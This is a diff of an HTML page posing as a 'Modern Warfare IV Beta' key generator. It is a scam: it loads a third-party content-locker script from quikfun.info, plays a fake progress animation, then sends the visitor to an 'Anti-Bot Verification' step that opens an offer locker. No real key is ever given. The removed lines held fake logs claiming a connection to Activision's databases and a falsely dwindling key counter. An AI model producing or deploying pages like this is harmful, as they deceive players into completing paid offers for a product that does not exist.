@@ -5,288 +5,69 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MW4 - Secure Beta Portal</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
         body {
             background-color: #0b0e14;
             color: #ffffff;
             background-image: linear-gradient(rgba(11, 14, 20, 0.85), rgba(11, 14, 20, 0.95)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1350&q=80');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        header {
-            width: 100%;
-            padding: 20px;
-            text-align: center;
-            background: rgba(16, 22, 32, 0.9);
-            border-bottom: 3px solid #ff4e00;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        header h1 {
-            font-size: 1.8rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #ff4e00;
-        }
-
-        header span {
-            color: #fff;
-        }
-
-        .container {
-            max-width: 600px;
-            width: 90%;
-            margin: 40px auto;
-            background: rgba(16, 22, 32, 0.95);
-            border: 1px solid #2a3447;
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-            text-align: center;
-        }
-
-        h2 {
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        p.subtitle {
-            color: #94a3b8;
-            font-size: 0.95rem;
-            margin-bottom: 25px;
-        }
-
-        .status-box {
-            display: flex;
-            justify-content: space-around;
-            background: rgba(255, 78, 0, 0.1);
-            border: 1px dashed #ff4e00;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 25px;
-            font-size: 0.9rem;
-        }
-
-        .status-item span {
-            font-weight: bold;
-            color: #ff4e00;
-        }
-
-        .step-title {
-            font-size: 1.1rem;
-            margin-bottom: 15px;
-            color: #ff4e00;
-            text-transform: uppercase;
-            font-weight: bold;
-        }
-
-        .platform-selector {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 25px;
-        }
-
-        .platform-btn {
-            background: #1e293b;
-            border: 2px solid #334155;
-            color: white;
-            padding: 15px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            font-size: 0.9rem;
-        }
-
-        .platform-btn:hover {
-            border-color: #ff4e00;
-            background: #2a3447;
-        }
-
-        .platform-btn.active {
-            background: #ff4e00;
-            border-color: #ff4e00;
-            box-shadow: 0 0 15px rgba(255, 78, 0, 0.4);
-        }
-
-        .action-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #ff4e00, #ec4899);
-            color: white;
-            border: none;
-            padding: 18px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-radius: 6px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 78, 0, 0.4);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .action-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 78, 0, 0.6);
-        }
-
-        /* Generator Animation Area */
-        .generator-console {
-            display: none;
-            background: #020617;
-            border: 1px solid #1e293b;
-            border-radius: 6px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.85rem;
-            color: #38bdf8;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-
-        .console-log {
-            margin-bottom: 8px;
-            line-height: 1.4;
-        }
-
-        .progress-container {
-            display: none;
-            width: 100%;
-            background-color: #1e293b;
-            border-radius: 10px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 12px;
-            background: linear-gradient(90deg, #ff4e00, #38bdf8);
-            box-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
-            transition: width 0.1s linear;
-        }
-
-        /* Overlay / Locker Call Trigger Style */
-        .verification-box {
-            display: none;
-            background: rgba(30, 41, 59, 0.5);
-            border: 2px solid #f43f5e;
-            border-radius: 6px;
-            padding: 20px;
-            margin-top: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(244, 63, 94, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0); }
-        }
-
-        .verification-box h3 {
-            color: #f43f5e;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-        }
-
-        .verify-btn {
-            background: #f43f5e;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 15px;
-            text-transform: uppercase;
-        }
-
         /* Force OgAds links to be white */
-        .og_offers a, #og_offers a, .offer-list a, .og-offer-text { 
+        .og_offers a, .offer-list a, .og-offer-text, .og-offer-title, a { 
             color: #ffffff !important; 
             text-decoration: none !important; 
         }
+
+        header { width: 100%; padding: 20px; text-align: center; background: rgba(16, 22, 32, 0.9); border-bottom: 3px solid #ff4e00; }
+        header h1 { font-size: 1.8rem; text-transform: uppercase; color: #ff4e00; }
+        
+        .container { max-width: 600px; width: 90%; margin: 40px auto; background: rgba(16, 22, 32, 0.95); border: 1px solid #2a3447; border-radius: 8px; padding: 30px; text-align: center; }
+        .action-btn { width: 100%; background: linear-gradient(135deg, #ff4e00, #ec4899); color: white; border: none; padding: 18px; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        
+        .generator-console { display: none; background: #020617; border: 1px solid #1e293b; padding: 20px; margin-top: 20px; text-align: left; font-family: monospace; font-size: 0.85rem; color: #38bdf8; }
+        .progress-container { display: none; width: 100%; background-color: #1e293b; height: 12px; margin: 20px 0; border-radius: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff4e00, #38bdf8); }
+        .verification-box { display: none; background: rgba(30, 41, 59, 0.5); border: 2px solid #f43f5e; padding: 20px; margin-top: 20px; }
+        .verify-btn { background: #f43f5e; color: white; border: none; padding: 12px 25px; font-size: 1rem; cursor: pointer; margin-top: 15px; }
     </style>
 
-    <!-- OGADS SCRIPT INJECTED HERE -->
+    <!-- OGADS SCRIPT -->
     <script type="text/javascript" id="ogjs" src="https://quikfun.info/cl/js/o4epoq"></script>
 </head>
 <body>
 
-    <header>
-        <h1>Modern Warfare <span>IV</span> Beta</h1>
-    </header>
+    <header><h1>Modern Warfare <span>IV</span> Beta</h1></header>
 
     <div class="container">
-        <h2>Key Generator Portal</h2>
-        <p class="subtitle">Select your platform to generate a secure Beta Key.</p>
-
-        <div class="status-box">
-            <div class="status-item">Status: <span>ONLINE</span></div>
-            <div class="status-item">Keys Left: <span id="keys-count">142</span></div>
-        </div>
-
         <div id="setup-area">
-            <div class="step-title">1. Select Your Platform</div>
-            <div class="platform-selector">
-                <button class="platform-btn active" onclick="selectPlatform(this, 'PC')">PC / BNET</button>
-                <button class="platform-btn" onclick="selectPlatform(this, 'PS5')">PS5</button>
-                <button class="platform-btn" onclick="selectPlatform(this, 'XBOX')">XBOX</button>
-            </div>
-
             <button class="action-btn" onclick="startGeneration()">Generate Beta Key</button>
         </div>
 
-        <!-- Animation Elements -->
         <div class="progress-container" id="progress-container">
             <div class="progress-bar" id="progress-bar"></div>
         </div>
-
         <div class="generator-console" id="generator-console"></div>
 
-        <!-- Verification Trigger -->
         <div class="verification-box" id="verification-box">
             <h3>Anti-Bot Verification Required</h3>
-            <p style="font-size: 0.9rem; color: #cbd5e1;">To prevent automated bots from hoarding MW4 Beta Keys, please manually verify your request.</p>
             <button class="verify-btn" onclick="callOgadsLocker()">Verify Now</button>
         </div>
     </div>
 
     <script>
-        let selectedPlatform = "PC";
-
-        setInterval(() => {
-            let countEl = document.getElementById('keys-count');
-            let currentCount = parseInt(countEl.innerText);
-            if(currentCount > 7) {
-                countEl.innerText = currentCount - Math.floor(Math.random() * 2);
+        // Force color update every 500ms
+        setInterval(function() {
+            var elements = document.querySelectorAll('a, .og-offer-text, .og-offer-title, .og-offer-description');
+            for (var i = 0; i < elements.length; i++) {
+                elements[i].style.color = '#ffffff';
             }
-        }, 8000);
-
-        function selectPlatform(element, platform) {
-            document.querySelectorAll('.platform-btn').forEach(btn => btn.classList.remove('active'));
-            element.classList.add('active');
-            selectedPlatform = platform;
-        }
+        }, 500);
 
         function startGeneration() {
             document.getElementById('setup-area').style.display = 'none';
@@ -295,54 +76,21 @@
 
             const consoleEl = document.getElementById('generator-console');
             const progressBar = document.getElementById('progress-bar');
-            
-            const logs = [
-                "Connecting to Activision main secure databases...",
-                "Searching for available unused MW4 Beta Pools...",
-                `Found available key package allocation for platform: ${selectedPlatform}`,
-                "Extracting unique 25-digit Alpha-Numeric validation key...",
-                "Key Generated successfully: MW4B-XXXXX-XXXXX-XXXXX",
-                "Error: Automated bot-like activity patterns detected from your IP.",
-                "Launching Anti-Bot Cryptographic Human Verification protocol..."
-            ];
-
-            let logIndex = 0;
             let progress = 0;
 
             const interval = setInterval(() => {
                 if (progress < 100) {
                     progress += 2;
                     progressBar.style.width = progress + '%';
-                    
-                    if (progress % 14 === 0 && logIndex < logs.length) {
-                        let p = document.createElement('div');
-                        p.className = 'console-log';
-                        p.innerText = `> ${logs[logIndex]}`;
-                        consoleEl.appendChild(p);
-                        consoleEl.scrollTop = consoleEl.scrollHeight;
-                        logIndex++;
-                    }
                 } else {
                     clearInterval(interval);
                     document.getElementById('verification-box').style.display = 'block';
-                    let p = document.createElement('div');
-                    p.className = 'console-log';
-                    p.style.color = '#f43f5e';
-                    p.style.fontWeight = 'bold';
-                    p.innerText = `> CRITICAL: Action Required. Please complete verification below to reveal full license key.`;
-                    consoleEl.appendChild(p);
-                    consoleEl.scrollTop = consoleEl.scrollHeight;
                 }
             }, 60);
         }
 
-        // TRIGGER THE OGADS LOCKER
         function callOgadsLocker() {
-            if (typeof og_load === 'function') {
-                og_load(); 
-            } else {
-                alert("Please disable AdBlock to complete verification.");
-            }
+            if (typeof og_load === 'function') { og_load(); } 
         }
     </script>
 </body>
